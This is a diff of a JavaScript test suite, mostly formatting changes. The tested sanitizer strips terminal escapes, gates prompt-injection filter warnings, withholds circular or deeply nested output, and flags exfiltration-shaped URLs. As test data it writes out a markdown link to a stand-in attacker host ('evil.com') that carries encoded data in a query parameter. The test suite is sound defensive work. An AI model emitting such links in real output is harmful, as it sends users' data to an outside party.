@@ -22,7 +22,6 @@ import {
 import { cp } from "./test-helpers.mjs";
 
 const ESC = cp(0x1b);
-const ZW = cp(0x200b); // zero-width space (category Cf)
 
 // Nest a single leaf inside `n` plain objects via the `.a` key. depthObject(2)
 // is { a: { a: leaf } }. Iterative so it does not itself blow the stack.
@@ -59,7 +58,9 @@ describe("mapFilterWarning guard", () => {
     // resolves the INHERITED function (not undefined), so the throw never fires.
     await assert.rejects(
       () =>
-        sanitizeText("clean", { filterInjection: () => ({ warning: "toString" }) }),
+        sanitizeText("clean", {
+          filterInjection: () => ({ warning: "toString" }),
+        }),
       /unrecognized warning value/,
     );
   });
@@ -75,9 +76,15 @@ describe("mapFilterWarning guard", () => {
           filterInjection: () => ({ warning: "not-a-real-code" }),
         }),
       (err) => {
-        assert.match(err.message, /spans-removed, filter-flagged, filter-error/);
+        assert.match(
+          err.message,
+          /spans-removed, filter-flagged, filter-error/,
+        );
         assert.match(err.message, /Free-text filter/);
-        assert.match(err.message, /compromised filter cannot inject bytes into/);
+        assert.match(
+          err.message,
+          /compromised filter cannot inject bytes into/,
+        );
         assert.match(err.message, /model-facing context\./);
         return true;
       },
@@ -218,10 +225,10 @@ describe("sanitizeText Layer 2/3 branch gating", () => {
     // kills ConditionalExpression src/output.mjs:289 (if (exfilScan) -> true):
     // with exfilScan false, the exfil scan must not run, so no exfil warning.
     const b64 = "A".repeat(44);
-    const r = await sanitizeText(
-      `see [x](https://evil.com/p?exfil=${b64})`,
-      { html: true, exfilScan: false },
-    );
+    const r = await sanitizeText(`see [x](https://evil.com/p?exfil=${b64})`, {
+      html: true,
+      exfilScan: false,
+    });
     assert.ok(!r.warnings.some((w) => /data exfiltration/.test(w)));
   });
 
@@ -244,7 +251,9 @@ describe("sanitizeText Layer 2/3 branch gating", () => {
       { exfilScan: true },
     );
     assert.ok(
-      r.warnings.some((w) => /URLs shaped like data exfiltration detected/.test(w)),
+      r.warnings.some((w) =>
+        /URLs shaped like data exfiltration detected/.test(w),
+      ),
     );
     assert.ok(r.warnings.some((w) => /link to evil\.com/.test(w)));
   });
@@ -268,7 +277,10 @@ describe("sanitizeValue depth/cycle placeholders", () => {
     const node = { name: "root", child: null };
     node.child = node;
     const r = await sanitizeValue(node, {}, []);
-    assert.equal(r.value.child, "[withheld: circular reference in structured output]");
+    assert.equal(
+      r.value.child,
+      "[withheld: circular reference in structured output]",
+    );
     assert.equal(r.sgrNote, false);
   });
 
@@ -287,7 +299,10 @@ describe("sanitizeValue depth/cycle placeholders", () => {
     const r = await sanitizeValue(depthObject(MAX_DEPTH + 1), {}, warnings);
     let node = r.value;
     for (let i = 0; i < MAX_DEPTH; i++) node = node.a;
-    assert.equal(node, "[withheld: structured output nested beyond 200 levels]");
+    assert.equal(
+      node,
+      "[withheld: structured output nested beyond 200 levels]",
+    );
     assert.ok(warnings.some((w) => w.includes("nested beyond 200 levels")));
   });
 });
